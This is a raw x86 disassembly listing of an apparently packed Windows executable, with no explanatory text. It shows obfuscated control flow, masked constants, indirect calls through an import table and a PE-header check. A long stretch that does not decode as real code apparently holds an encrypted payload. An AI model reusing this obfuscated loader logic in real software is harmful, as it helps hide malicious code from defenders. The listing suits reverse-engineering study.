  40617b:	mov    DWORD PTR ds:0x42f004,ecx
  406181:	movzx  ecx,WORD PTR [ecx+esi*2]
  406185:	mov    edx,DWORD PTR [ebp-0x18]
  406188:	mov    DWORD PTR ds:0x43200c,0x2155
  406192:	mov    ecx,DWORD PTR [edx+ecx*4]
  406195:	mov    DWORD PTR ds:0x432018,0x40b3
  40619f:	mov    DWORD PTR [ebp-0x38],ecx
  4061a2:	mov    DWORD PTR ds:0x430000,0x465
  4061ac:	jmp    0x40606c
  4061b1:	and    DWORD PTR ds:0x42f00c,edx
  4061b7:	mov    ecx,DWORD PTR [ebp-0x14]
  4061ba:	xor    ecx,ebx
  4061bc:	lea    esi,[esi+ecx*1+0x3272d9]
  4061c3:	mov    DWORD PTR ds:0x42e018,0x6c1f
  4061cd:	jmp    0x403a0e
  4061d2:	sbb    eax,DWORD PTR ds:0x430008
  4061d8:	mov    eax,DWORD PTR [ebp-0x4]
  4061db:	xor    DWORD PTR ds:0x430018,0x43200c
  4061e5:	xor    eax,ebx
  4061e7:	or     DWORD PTR ds:0x432018,0x103b
  4061f1:	add    eax,edi
  4061f3:	jmp    0x40636b
  4061f8:	mov    eax,DWORD PTR [ebp-0x4]
  4061fb:	xor    eax,ebx
  4061fd:	add    eax,0x3272d9
  406202:	jmp    0x40636b
  406207:	mov    ecx,DWORD PTR [ebp-0x38]
  40620a:	add    ecx,DWORD PTR [ebp+0x8]
  40620d:	mov    DWORD PTR [ebp-0x10],ecx
  406210:	mov    ecx,DWORD PTR [ebp-0x1c]
  406213:	test   ecx,ecx
  406215:	je     0x4062f6
  40621b:	mov    DWORD PTR [ebp-0x20],0x0
  406222:	push   0x3
  406224:	xor    edx,edx
  406226:	pop    edx
  406227:	add    edx,0x8
  40622a:	push   edx
  40622b:	pop    ecx
  40622c:	push   0x6
  40622e:	dec    ecx
  40622f:	pop    ebx
  406230:	dec    ebx
  406231:	xchg   ebx,ecx
  406233:	sub    ebx,ecx
  406235:	xchg   ebx,ecx
  406237:	dec    ecx
  406238:	mov    eax,DWORD PTR [ebp-0x1c]
  40623b:	imul   eax,ecx
  40623e:	sub    esp,eax
  406240:	mov    DWORD PTR [ebp-0x20],esp
  406243:	mov    eax,DWORD PTR [ebp-0x4]
  406246:	mov    ecx,0x7510891
  40624b:	xor    eax,ecx
  40624d:	mov    edx,0x3272d9
  406252:	add    eax,edx
  406254:	mov    DWORD PTR [ebp+0x8],eax
  406257:	mov    eax,DWORD PTR [ebp-0x14]
  40625a:	xor    eax,ecx
  40625c:	add    eax,edx
  40625e:	mov    edx,DWORD PTR [ebp+0x14]
  406261:	imul   eax,DWORD PTR [edx]
  406264:	mov    edx,DWORD PTR [ebp-0x4]
  406267:	xor    edx,ecx
  406269:	mov    ecx,DWORD PTR [ebp+0x8]
  40626c:	lea    ecx,[edx+ecx*1+0x3272d9]
  406273:	cmp    ecx,eax
  406275:	je     0x4062ec
  40627b:	mov    edi,DWORD PTR [ebp-0x14]
  40627e:	mov    eax,DWORD PTR [ebp+0x8]
  406281:	mov    edx,DWORD PTR [ebp+0x14]
  406284:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406288:	mov    ecx,0x7510891
  40628d:	xor    edx,edx
  40628f:	xor    edi,ecx
  406291:	mov    esi,0x3272d9
  406296:	add    edi,esi
  406298:	div    edi
  40629a:	mov    edx,DWORD PTR [ebp-0x4]
  40629d:	xor    edx,ecx
  40629f:	lea    eax,[edx+eax*1+0x3272d9]
  4062a6:	mov    edx,DWORD PTR [ebp+0x8]
  4062a9:	mov    edi,DWORD PTR [ebp-0x20]
  4062ac:	mov    DWORD PTR [edi+edx*4],eax
  4062af:	mov    eax,DWORD PTR [ebp-0x14]
  4062b2:	mov    edx,DWORD PTR [ebp+0x8]
  4062b5:	xor    eax,ecx
  4062b7:	lea    eax,[eax+edx*1+0x3272d9]
  4062be:	mov    DWORD PTR [ebp+0x8],eax
  4062c1:	mov    eax,DWORD PTR [ebp-0x14]
  4062c4:	mov    edx,DWORD PTR [ebp+0x14]
  4062c7:	xor    eax,ecx
  4062c9:	add    eax,esi
  4062cb:	imul   eax,DWORD PTR [edx]
  4062ce:	mov    edx,DWORD PTR [ebp-0x4]
  4062d1:	xor    edx,ecx
  4062d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4062d6:	lea    ecx,[edx+ecx*1+0x3272d9]
  4062dd:	cmp    ecx,eax
  4062df:	jne    0x40627b
  4062e5:	mov    eax,esi
  4062e7:	jmp    0x4062f1
  4062ec:	mov    eax,0x3272d9
  4062f1:	mov    ebx,0x7510891
  4062f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4062f9:	xor    ecx,ebx
  4062fb:	add    ecx,eax
  4062fd:	mov    DWORD PTR [ebp-0xc],ecx
  406300:	mov    ebx,0x3874
  406305:	add    ebx,0x2342
  40630b:	xchg   ebx,esi
  40630d:	xor    ebx,ebx
  40630f:	push   esi
  406310:	mov    esi,ebx
  406312:	pop    ebx
  406313:	mov    edx,esi
  406315:	add    ebx,0x1002
  40631b:	lea    eax,[ebp-0x10]
  40631e:	add    edx,eax
  406320:	add    edx,0x5
  406323:	push   edx
  406324:	inc    esi
  406325:	pop    ecx
  406326:	dec    ecx
  406327:	xchg   ecx,eax
  406328:	dec    eax
  406329:	xchg   ecx,eax
  40632a:	dec    ecx
  40632b:	xchg   ecx,edx
  40632d:	dec    edx
  40632e:	push   edx
  40632f:	mov    edx,ebx
  406331:	pop    ebx
  406332:	dec    ebx
  406333:	call   DWORD PTR [ebx]
  406335:	cmp    DWORD PTR [ebp+0x10],esi
  406338:	je     0x406357
  40633e:	xchg   edx,eax
  40633f:	push   0xb
  406341:	pop    ecx
  406342:	push   0x4
  406344:	pop    ebx
  406345:	inc    ebx
  406346:	xchg   ebx,ecx
  406348:	sub    ebx,ecx
  40634a:	xchg   ebx,ecx
  40634c:	dec    ecx
  40634d:	dec    ecx
  40634e:	mov    eax,DWORD PTR [ebp-0x1c]
  406351:	imul   eax,ecx
  406354:	add    esp,eax
  406356:	xchg   edx,eax
  406357:	push   eax
  406358:	xor    ebx,ebx
  40635a:	mov    edx,esp
  40635c:	dec    edx
  40635d:	inc    ebx
  40635e:	add    ebx,DWORD PTR [edx+ebx*1]
  406361:	dec    ebx
  406362:	xor    edx,edx
  406364:	add    DWORD PTR [ebp-0xc],ebx
  406367:	pop    ebx
  406368:	mov    eax,DWORD PTR [ebp-0xc]
  40636b:	pop    edi
  40636c:	pop    esi
  40636d:	pop    ebx
  40636e:	leave  
  40636f:	ret    0x10
  406372:	xor    DWORD PTR ds:0x43101c,0x42e020
  40637c:	xor    eax,eax
  40637e:	add    DWORD PTR ds:0x431010,0x438d
  406388:	inc    eax
  406389:	ret    
  40638a:	push   ebp
  40638b:	mov    ebp,esp
  40638d:	mov    eax,ds:0x41c553
  406392:	mov    eax,DWORD PTR [eax+0x1c8]
  406398:	and    DWORD PTR ds:0x430014,0x0
  4063a2:	mov    ecx,DWORD PTR ds:0x430014
  4063a8:	inc    ecx
  4063a9:	mov    DWORD PTR ds:0x430014,ecx
  4063af:	cmp    DWORD PTR ds:0x430014,0x7
  4063b6:	jne    0x4063d5
  4063bc:	push   DWORD PTR [ebp-0x20]
  4063bf:	push   0x5d26
  4063c4:	push   DWORD PTR [ebp-0x18]
  4063c7:	push   0x7426
  4063cc:	push   DWORD PTR [ebp-0x14]
  4063cf:	call   DWORD PTR ds:0x42a044
  4063d5:	cmp    DWORD PTR ds:0x430014,0x6
  4063dc:	jne    0x4063f1
  4063e2:	xor    ecx,ecx
  4063e4:	xor    ecx,DWORD PTR ds:0x430014
  4063ea:	inc    ecx
  4063eb:	mov    DWORD PTR ds:0x430014,ecx
  4063f1:	cmp    DWORD PTR ds:0x430014,0x19
  4063f8:	jb     0x4063a2
  4063fe:	mov    eax,DWORD PTR [eax]
  406400:	movzx  ecx,BYTE PTR ds:0x42f01c
  406407:	sbb    ecx,DWORD PTR ds:0x42e014
  40640d:	mov    DWORD PTR ds:0x42f01c,ecx
  406413:	cdq    
  406414:	and    DWORD PTR ds:0x431008,0x0
  40641e:	push   DWORD PTR ds:0x431008
  406424:	pop    ecx
  406425:	inc    ecx
  406426:	mov    DWORD PTR ds:0x431008,ecx
  40642c:	cmp    DWORD PTR ds:0x431008,0x1e
  406433:	jne    0x406442
  406439:	push   DWORD PTR [ebp-0x28]
  40643c:	call   DWORD PTR ds:0x42a018
  406442:	cmp    DWORD PTR ds:0x431008,0x14
  406449:	jb     0x40641e
  40644f:	add    ecx,0x5515
  406455:	push   ebx
  406456:	and    DWORD PTR ds:0x42e018,0x0
  406460:	jmp    0x406472
  406465:	mov    ebx,DWORD PTR ds:0x42e018
  40646b:	inc    ebx
  40646c:	mov    DWORD PTR ds:0x42e018,ebx
  406472:	cmp    DWORD PTR ds:0x42e018,0x19
  406479:	jae    0x4064ca
  40647f:	cmp    DWORD PTR ds:0x42e018,0x4
  406486:	jne    0x4064aa
  40648c:	push   0x423947
  406491:	push   0x6dd4
  406496:	push   DWORD PTR [ebp-0x1c]
  406499:	push   DWORD PTR [ebp-0x24]
  40649c:	push   DWORD PTR [ebp-0x1c]
  40649f:	push   0x5bda
  4064a4:	call   DWORD PTR ds:0x42a01c
  4064aa:	cmp    DWORD PTR ds:0x42e018,0x3
  4064b1:	jne    0x4064c4
  4064b7:	mov    ebx,DWORD PTR ds:0x42e018
  4064bd:	inc    ebx
  4064be:	mov    DWORD PTR ds:0x42e018,ebx
  4064c4:	jmp    0x406465
  4064c9:	dec    ebx
  4064ca:	mov    ecx,0xfabdbef3
  4064cf:	and    DWORD PTR ds:0x42f014,0x0
  4064d9:	jmp    0x4064ec
  4064de:	push   DWORD PTR ds:0x42f014
  4064e4:	pop    ebx
  4064e5:	inc    ebx
  4064e6:	mov    DWORD PTR ds:0x42f014,ebx
  4064ec:	cmp    DWORD PTR ds:0x42f014,0x14
  4064f3:	jae    0x406519
  4064f9:	cmp    DWORD PTR ds:0x42f014,0x17
  406500:	jne    0x406514
  406506:	push   0x4238c9
  40650b:	push   DWORD PTR [ebp-0x28]
  40650e:	call   DWORD PTR ds:0x42a020
  406514:	jmp    0x4064de
  406519:	add    eax,ecx
  40651b:	adc    edx,0xffffffff
  40651e:	push   esi
  40651f:	push   edi
  406520:	mov    edi,edx
  406522:	mov    edx,DWORD PTR [ebp+0x8]
  406525:	mov    ebx,eax
  406527:	mov    eax,0x8a29a121
  40652c:	xor    esi,esi
  40652e:	xor    ebx,eax
  406530:	xor    edi,0x0
  406533:	add    edx,ecx
  406535:	adc    esi,0xffffffff
  406538:	xor    edx,eax
  40653a:	xor    esi,0x0
  40653d:	cmp    edx,ebx
  40653f:	jne    0x40654d
  406545:	cmp    esi,edi
  406547:	je     0x40657c
  40654d:	mov    edx,DWORD PTR ds:0x41c553
  406553:	mov    edx,DWORD PTR [edx+0x1c0]
  406559:	mov    edx,DWORD PTR [edx]
  40655b:	xor    esi,esi
  40655d:	add    edx,ecx
  40655f:	adc    esi,0xffffffff
  406562:	xor    edx,eax
  406564:	xor    esi,0x0
  406567:	cmp    edx,0x70941fd5
  40656d:	jne    0x4065e6
  406573:	cmp    esi,0xffffffff
  406576:	jne    0x4065e6
  40657c:	mov    edx,DWORD PTR ds:0x41c5d7
  406582:	mov    esi,DWORD PTR ds:0x41c5cf
  406588:	xor    edx,esi
  40658a:	mov    DWORD PTR ds:0x41c5cf,edx
  406590:	mov    edx,DWORD PTR [ebp+0xc]
  406593:	mov    edx,DWORD PTR [edx]
  406595:	mov    edx,DWORD PTR [edx]
  406597:	mov    esi,DWORD PTR ds:0x41c5cf
  40659d:	add    DWORD PTR [edx],esi
  40659f:	mov    esi,DWORD PTR [ebp+0x8]
  4065a2:	mov    edx,DWORD PTR ds:0x41c5cf
  4065a8:	xor    esi,0x7510891
  4065ae:	add    esi,0x3272d9
  4065b4:	xor    ebx,ebx
  4065b6:	add    esi,ecx
  4065b8:	adc    ebx,0xffffffff
  4065bb:	xor    edi,edi
  4065bd:	xor    esi,eax
  4065bf:	xor    ebx,0x0
  4065c2:	add    edx,ecx
  4065c4:	adc    edi,0xffffffff
  4065c7:	xor    edx,eax
  4065c9:	xor    edi,0x0
  4065cc:	cmp    edx,esi
  4065ce:	jne    0x4065e6
  4065d4:	cmp    edi,ebx
  4065d6:	jne    0x4065e6
  4065dc:	mov    eax,ds:0x41c5cf
  4065e1:	mov    ds:0x41c5d7,eax
  4065e6:	pop    edi
  4065e7:	pop    esi
  4065e8:	pop    ebx
  4065e9:	pop    ebp
  4065ea:	ret    0x8
  4065ed:	push   ebp
  4065ee:	mov    ebp,esp
  4065f0:	push   ecx
  4065f1:	sub    eax,DWORD PTR ds:0x431000
  4065f7:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4065fe:	movzx  eax,WORD PTR ds:0x431010
  406605:	or     DWORD PTR ds:0x42e000,eax
  40660b:	mov    eax,DWORD PTR [ebp+0x8]
  40660e:	mov    al,BYTE PTR [eax]
  406610:	inc    DWORD PTR ds:0x43100c
  406616:	add    al,0xe
  406618:	and    DWORD PTR ds:0x42e010,0x43200c
  406622:	xor    al,0x6e
  406624:	mov    DWORD PTR ds:0x431014,0x5cbc
  40662e:	cmp    al,0x35
  406630:	mov    DWORD PTR ds:0x42e008,0x7d8f
  40663a:	jne    0x4066d8
  406640:	mov    eax,DWORD PTR [ebp+0x8]
  406643:	mov    ecx,DWORD PTR [ebp+0x8]
  406646:	add    ecx,DWORD PTR [eax+0x3c]
  406649:	mov    DWORD PTR ds:0x43201c,0x82c
  406653:	mov    edx,0x7510891
  406658:	adc    DWORD PTR ds:0x42e014,ecx
  40665e:	mov    DWORD PTR [ebp+0x8],ecx
  406661:	mov    DWORD PTR ds:0x430008,0x1a
  40666b:	cmp    DWORD PTR ds:0x430008,0x0
  406672:	je     0x4066aa
  406678:	cmp    DWORD PTR ds:0x430008,0x28
  40667f:	jne    0x406698
  406685:	push   0x458f
  40668a:	push   0x42e01c
  40668f:	push   DWORD PTR [ebp-0xc]
  406692:	call   DWORD PTR ds:0x42a024
  406698:	mov    ecx,DWORD PTR ds:0x430008
  40669e:	dec    ecx
  40669f:	mov    DWORD PTR ds:0x430008,ecx
  4066a5:	jmp    0x40666b
  4066aa:	mov    eax,DWORD PTR [ebp-0x4]
  4066ad:	xor    eax,edx
  4066af:	push   esi
  4066b0:	mov    esi,DWORD PTR [ebp+0x8]
  4066b3:	mov    ecx,0x3272d9
  4066b8:	add    eax,ecx
  4066ba:	cmp    DWORD PTR [esi+0x54],eax
  4066bd:	pop    esi
  4066be:	je     0x4066cc
  4066c4:	mov    eax,DWORD PTR [ebp+0x8]
  4066c7:	jmp    0x4066e5
  4066cc:	mov    eax,DWORD PTR [ebp-0x4]
  4066cf:	xor    eax,edx
  4066d1:	add    eax,ecx
  4066d3:	jmp    0x4066e5
  4066d8:	mov    eax,DWORD PTR [ebp-0x4]
  4066db:	xor    eax,0x7510891
  4066e0:	add    eax,0x3272d9
  4066e5:	leave  
  4066e6:	ret    0x4
  4066e9:	push   ebp
  4066ea:	mov    ebp,esp
  4066ec:	sub    esp,0x18
  4066ef:	xor    DWORD PTR ds:0x430000,0x1c9f
  4066f9:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  406700:	lea    eax,[ebp+0x14]
  406703:	mov    ecx,DWORD PTR ds:0x41c37f
  406709:	xor    edx,edx
  40670b:	or     edx,DWORD PTR ds:0x41c387
  406711:	sub    ecx,edx
  406713:	and    ecx,DWORD PTR [ecx+edx*1]
  406716:	mov    DWORD PTR [ebp-0x4],eax
  406719:	mov    DWORD PTR ds:0x432018,0x10
  406723:	cmp    DWORD PTR ds:0x432018,0x0
  40672a:	je     0x40675a
  406730:	cmp    DWORD PTR ds:0x432018,0x15
  406737:	jne    0x406748
  40673d:	push   0x423947
  406742:	call   DWORD PTR ds:0x42a028
  406748:	mov    edx,DWORD PTR ds:0x432018
  40674e:	dec    edx
  40674f:	mov    DWORD PTR ds:0x432018,edx
  406755:	jmp    0x406723
  40675a:	push   esi
  40675b:	movzx  edx,BYTE PTR ds:0x42e018
  406762:	sbb    edx,DWORD PTR ds:0x430004
  406768:	mov    DWORD PTR ds:0x42e018,edx
  40676e:	mov    esi,0xf89c85b6
  406773:	mov    DWORD PTR ds:0x43000c,0x15
  40677d:	cmp    DWORD PTR ds:0x43000c,0x0
  406784:	je     0x4067b9
  40678a:	cmp    DWORD PTR ds:0x43000c,0x1d
  406791:	jne    0x4067a7
  406797:	push   0x42e020
  40679c:	push   0x37b5
  4067a1:	call   DWORD PTR ds:0x42a02c
  4067a7:	mov    ecx,DWORD PTR ds:0x43000c
  4067ad:	dec    ecx
  4067ae:	mov    DWORD PTR ds:0x43000c,ecx
  4067b4:	jmp    0x40677d
  4067b9:	mov    DWORD PTR [ebp-0xc],esi
  4067bc:	sub    ecx,DWORD PTR ds:0x42e000
  4067c2:	lea    eax,[ebp-0xc]
  4067c5:	mov    DWORD PTR [ebp-0x14],eax
  4067c8:	mov    DWORD PTR ds:0x432010,0x13
  4067d2:	cmp    DWORD PTR ds:0x432010,0x0
  4067d9:	je     0x406809
  4067df:	cmp    DWORD PTR ds:0x432010,0x19
  4067e6:	jne    0x4067f5
  4067ec:	push   DWORD PTR [ebp-0x10]
  4067ef:	call   DWORD PTR ds:0x42a030
  4067f5:	mov    edx,DWORD PTR ds:0x432010
  4067fb:	dec    edx
  4067fc:	mov    DWORD PTR ds:0x432010,edx
  406802:	jmp    0x4067d2
  406807:	neg    edx
  406809:	mov    eax,DWORD PTR [ebp-0xc]
  40680c:	mov    edx,DWORD PTR [ebp-0x14]
  40680f:	mov    DWORD PTR ds:0x42e014,0x1b
  406819:	cmp    DWORD PTR ds:0x42e014,0x0
  406820:	je     0x408bc7
  406826:	cmp    DWORD PTR ds:0x42e014,0x9
  40682d:	jne    0x40683e
  406833:	push   0x6a2f
  406838:	call   DWORD PTR ds:0x42a034
  40683e:	cmp    DWORD PTR ds:0x42e014,0xa
  406845:	jne    0x406858
  40684b:	mov    ecx,DWORD PTR ds:0x42e014
  406851:	dec    ecx
  406852:	mov    DWORD PTR ds:0x42e014,ecx
  406858:	xor    ecx,ecx
  40685a:	or     ecx,DWORD PTR ds:0x42e014
  406860:	dec    ecx
  406861:	mov    DWORD PTR ds:0x42e014,ecx
  406867:	jmp    0x406819
  40686c:	movzx  ecx,BYTE PTR ds:0x430008
  406873:	and    DWORD PTR ds:0x42e008,ecx
  406879:	jmp    0x408bc7
  40687e:	(bad)  
  40687f:	cmp    ecx,DWORD PTR [esi]
  406881:	pop    ebp
  406882:	arpl   WORD PTR ds:0x22c1b363,bp
  406888:	iret   
  406889:	retf   
  40688a:	mov    bl,0x63
  40688c:	and    DWORD PTR [eax+0x6f],ebp
  40688f:	cmp    ah,BYTE PTR [eax+0x60]
  406892:	push   ecx
  406893:	pop    edi
  406894:	pusha  
  406895:	pusha  
  406896:	aam    0xcb
  406898:	inc    BYTE PTR [ebx-0x1b]
  40689b:	pusha  
  40689c:	popf   
  40689d:	xor    al,0xb3
  40689f:	jnp    0x40686d
  4068a1:	mov    esp,0x5e91997c
  4068a6:	loope  0x4068e0
  4068a8:	iret   
  4068a9:	ror    al,cl
  4068ab:	mov    ds:0x393c9698,al
  4068b0:	sbb    al,0x41
  4068b2:	test   BYTE PTR [ebx],bl
  4068b4:	pop    ss
  4068b5:	sbb    BYTE PTR [edx-0x20],ah
  4068b8:	push   cs
  4068b9:	in     al,0x17
  4068bb:	nop
  4068bc:	push   ss
  4068bd:	je     0x4068d5
  4068bf:	ds sbb al,0xba
  4068c2:	add    BYTE PTR [esi+0xb445697],cl
  4068c8:	(bad)  
  4068c9:	fsubr  QWORD PTR [edi-0x14]
  4068cc:	pop    es
  4068cd:	call   0xa93ae5c4
  4068d2:	rol    bl,1
  4068d4:	dec    eax
  4068d5:	xchg   esp,eax
  4068d6:	add    ecx,0xffffffee
  4068d9:	retf   
  4068da:	cld    
  4068db:	cmc    
  4068dc:	(bad)  
  4068dd:	loopne 0x406887
  4068df:	xchg   edx,eax
  4068e0:	aas    
  4068e1:	(bad)  
  4068e2:	out    0xa9,al
  4068e4:	mov    al,ds:0x8d98383e
  4068e9:	mov    dl,0xf6
  4068eb:	mov    ah,0xad
  4068ed:	mov    BYTE PTR [edi-0x46dd04a1],ah
  4068f3:	mov    ?,esp
  4068f5:	sbb    DWORD PTR [eax-0xa],edi
  4068f8:	inc    ecx
  4068f9:	sub    eax,0x1ec840fa
  4068fe:	popf   
  4068ff:	jo     0x4068ed
  406901:	loope  0x40690b
  406903:	les    eax,FWORD PTR [edx]
  406905:	xor    esp,0x42
  406908:	ja     0x406932
  40690a:	add    bh,BYTE PTR [ecx+0xc]
  40690d:	int    0x76
  40690f:	test   esi,ecx
  406911:	mov    es,WORD PTR [esi]
  406913:	mov    ds:0x61c6e8a9,eax
  406918:	push   esp
  406919:	jo     0x4068ed
  40691b:	clts   
  40691d:	stos   DWORD PTR es:[edi],eax
  40691e:	sar    BYTE PTR [ebp+0x584081b7],0xa4
  406925:	outs   dx,DWORD PTR ds:[esi]
  406926:	jle    0x4068c0
  406928:	fcomp  DWORD PTR [esi+0x7b]
  40692b:	xchg   ebx,eax
  40692c:	sub    DWORD PTR [edi+eax*2+0x4e1afdd5],ebx
  406933:	adc    BYTE PTR [eax-0x6a2bf629],dh
  406939:	dec    DWORD PTR [ecx]
  40693b:	mov    al,BYTE PTR ss:[eax-0x75]
  40693f:	in     al,0xc8
  406941:	cmp    al,0x4d
  406943:	aas    
  406944:	sub    eax,DWORD PTR [ebp+0x5]
  406947:	cs add cl,ch
  40694a:	pand   mm5,QWORD PTR [ebp+0x1ac83be6]
  406951:	jl     0x40695e
  406953:	loope  0x40690f
  406955:	idiv   ebx
  406957:	(bad)  
  406958:	cmp    al,0x38
  40695a:	retf   0x3ded
  40695d:	ret    
  40695e:	imul   ebp,DWORD PTR [edx+edx*8+0x5d],0x256ef2c6
  406966:	not    BYTE PTR ds:0xc400252b
  40696c:	jns    0x4069d6
  40696e:	mov    dh,0x5d
  406970:	add    ecx,DWORD PTR [ebx+0x2977d7e1]
  406976:	inc    ecx
  406977:	dec    ebx
  406978:	in     al,dx
  406979:	jl     0x40698c
  40697b:	pop    edx
  40697c:	fcom   QWORD PTR [edi]
  40697e:	repz shr bh,cl
  406981:	daa    
  406982:	leave  
  406983:	sbb    DWORD PTR [edx+0xe2e1906],edx
  406989:	adc    al,0x27
  40698b:	or     ebx,ebx
  40698d:	and    ecx,DWORD PTR [ebx+edi*4+0x27]
  406991:	in     al,dx
  406992:	adc    cl,cl
  406994:	sub    dl,ah
  406996:	push   ebp
  406997:	sbb    ecx,DWORD PTR [esi-0x49]
  40699a:	mov    cl,BYTE PTR [edi]
  40699c:	das    
  40699d:	xchg   DWORD PTR [esp+eax*2],eax
  4069a0:	pop    esi
  4069a1:	daa    
  4069a2:	repnz pop es
  4069a4:	in     eax,dx
  4069a5:	dec    ebx
  4069a6:	push   ss
  4069a7:	lahf   
  4069a8:	mov    eax,0xadfa1f15
  4069ad:	adc    eax,eax
  4069af:	sbb    bh,BYTE PTR [edi-0x5a5298e]
  4069b5:	push   0x4e
  4069b7:	fisttp DWORD PTR [esi]
  4069b9:	push   0x63
  4069bb:	or     BYTE PTR ds:0x14f1d304,bl
  4069c1:	cwde   
  4069c2:	mov    WORD PTR [edi+0x25],cs
  4069c5:	or     DWORD PTR [eax],ecx
  4069c7:	xor    eax,0xaaa7ddb3
  4069cc:	lahf   
  4069cd:	mov    ds:0x1db2ade3,al
  4069d2:	sahf   
  4069d3:	test   BYTE PTR [edi-0x11],0x23
  4069d7:	stos   BYTE PTR es:[edi],al
  4069d8:	lods   eax,DWORD PTR ds:[esi]
  4069d9:	push   eax
  4069da:	jns    0x4069b8
  4069dc:	enter  0x137c,0x13
  4069e0:	scas   eax,DWORD PTR es:[edi]
  4069e1:	rcr    BYTE PTR [ecx-0x328d8562],1
  4069e7:	aam    0x79
  4069e9:	xchg   esp,eax
  4069ea:	fs dec ebx
  4069ec:	shr    DWORD PTR [ecx-0x76],cl
  4069ef:	ja     0x4069f3
  4069f1:	retf   
  4069f2:	mov    al,ds:0xbb8761b8
  4069f7:	jne    0x406a20
  4069f9:	mov    al,ds:0x88af83a6
  4069fe:	and    al,BYTE PTR [ecx]
  406a00:	pop    ss
  406a01:	xlat   BYTE PTR ds:[ebx]
  406a02:	cli    
  406a03:	(bad)  
  406a04:	iret   
  406a05:	sub    eax,0xf30a40f8
  406a0a:	leave  
  406a0b:	mov    eax,0x5d0f8c86
  406a10:	fcom   QWORD PTR [ecx]
  406a12:	xor    BYTE PTR [edi+eax*1+0x16],cl
  406a16:	xchg   esp,eax
  406a17:	cli    
  406a18:	cs sbb ch,dh
  406a1b:	pop    ds
  406a1c:	mov    bh,0xd8
  406a1e:	ss in  al,0x60
  406a21:	je     0x406a6f
  406a23:	dec    esi
  406a24:	loope  0x406a0e
  406a26:	(bad)  
  406a28:	sahf   
  406a29:	fsub   DWORD PTR [eax+0x6e]
  406a2c:	xor    bh,BYTE PTR [edx+0x73]
  406a2f:	js     0x4069e4
  406a31:	test   BYTE PTR [edx-0x2f],0xb4
  406a35:	jmp    0xade:0x4724965f
  406a3c:	ss mov bh,0x0
  406a3f:	dec    edx
  406a40:	fucomp st(6)
  406a42:	sbb    eax,0x6781c9b0
  406a47:	aaa    
  406a48:	and    al,bl
  406a4a:	fmul   DWORD PTR [eax+0x61]
  406a4d:	dec    eax
  406a4e:	fist   DWORD PTR [ecx-0x69326f4d]
  406a54:	adc    eax,0xd44532c0
  406a59:	shl    ah,cl
  406a5b:	(bad)  
  406a5c:	cmc    
  406a5d:	mov    esp,0x364d7a60
  406a62:	push   ds
  406a63:	fimul  DWORD PTR [ecx]
  406a65:	push   edx
  406a66:	jecxz  0x4069fa
  406a68:	adc    DWORD PTR [ebx],edi
  406a6a:	sbb    bl,BYTE PTR [esp+edi*4+0x4e]
  406a6e:	jg     0x406aee
  406a70:	push   ecx
  406a71:	repz jnp 0x406ade
  406a74:	cdq    
  406a75:	mov    DWORD PTR [eax+0x1730689c],ebp
  406a7b:	clc    
  406a7c:	loope  0x406a6b
  406a7e:	test   eax,0xac89dc41
  406a83:	out    0x7b,eax
  406a85:	imul   ecx,DWORD PTR [edi+0x58d5c65],0xffffff8f
  406a8c:	xchg   esi,eax
  406a8d:	and    al,0xd4
  406a8f:	pop    ss
  406a90:	push   eax
  406a91:	in     al,0x20
  406a93:	adc    BYTE PTR [ebp+0xc],bh
  406a96:	mov    al,ds:0x4ccadf4
  406a9b:	nop
  406a9c:	scas   eax,DWORD PTR es:[edi]
  406a9d:	xchg   ebp,eax
  406a9e:	fwait
  406a9f:	cmc    
  406aa0:	cmp    ch,BYTE PTR [eax+esi*4]
  406aa3:	aaa    
  406aa4:	lods   al,BYTE PTR ds:[esi]
  406aa5:	adc    DWORD PTR [ecx+ebp*8],esi
  406aa8:	dec    BYTE PTR [ebp-0x47]
  406aab:	sbb    ebp,eax
  406aad:	push   ebx
  406aae:	and    bh,BYTE PTR [edx]
  406ab0:	fsubrp st(1),st
  406ab2:	pop    esi
  406ab3:	xchg   BYTE PTR [ebx+0x459be615],dh
  406ab9:	mov    al,ds:0x1542b84b
  406abe:	and    ah,BYTE PTR [ebx-0x4d]
  406ac1:	pop    ebp
  406ac2:	mov    dl,0x86
  406ac4:	mov    al,0x34
  406ac6:	mov    DWORD PTR [edx],ebx
  406ac8:	mov    dh,BYTE PTR [ecx]
  406aca:	test   eax,0x37d910bd
  406acf:	ja     0x406a66
  406ad1:	or     ecx,DWORD PTR [ecx]
  406ad3:	sub    dh,ch
  406ad5:	out    dx,al
  406ad6:	dec    esp
  406ad7:	add    DWORD PTR [di],ecx
  406ada:	mov    ebx,0xd489250d
  406adf:	dec    eax
  406ae0:	add    ebp,DWORD PTR [eax+eax*1]
  406ae3:	xor    BYTE PTR [eax],ah
  406ae5:	ss pushaw 
  406ae8:	and    esp,DWORD PTR [esi+0x21dc7f20]
  406aee:	and    ch,BYTE PTR [ebp+0x32]
  406af1:	jnp    0x406b6d
  406af3:	call   0xfec30f32
  406af8:	and    eax,0x21ad5bbd
  406afd:	and    ebx,DWORD PTR [ebx]
  406aff:	push   0x37
  406b01:	js     0x406aaa
  406b03:	dec    ebx
  406b04:	mov    al,0xd8
  406b06:	sub    DWORD PTR [edi-0x5e887502],ebp
  406b0c:	xor    bh,BYTE PTR [eax+0x4b7db87c]
  406b12:	mov    edx,0x88e0619c
  406b17:	cs mov ch,0x2
  406b1a:	and    al,BYTE PTR [edi-0x54bab5a4]
  406b20:	loope  0x406b30
  406b22:	adc    DWORD PTR [edx+esi*8+0x50],0xd2e2252d
  406b2a:	xchg   edx,eax
  406b2b:	dec    eax
  406b2c:	add    eax,0x33fb04c8
  406b31:	mov    edx,0xbcfcad30
  406b36:	sub    eax,0x650948cc
  406b3b:	jl     0x406bb2
  406b3d:	inc    esi
  406b3e:	ins    BYTE PTR es:[edi],dx
  406b3f:	repnz push es
  406b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b42:	mov    ah,0xe3
  406b44:	xchg   edx,eax
  406b45:	mov    esp,DWORD PTR [ebx+0x4a4679d3]
  406b4b:	fiadd  DWORD PTR ds:0x43d28668
  406b51:	jns    0x406aef
  406b53:	lock jl 0x406b49
  406b56:	xchg   edx,eax
  406b57:	jp     0x406ba3
  406b59:	bound  ebx,QWORD PTR [edi]
  406b5b:	push   esi
  406b5c:	jmp    0x4943:0x852e6b2e
  406b63:	push   cs
  406b64:	jg     0x406baf
  406b66:	(bad)  
  406b67:	in     al,0xd6
  406b69:	inc    edi
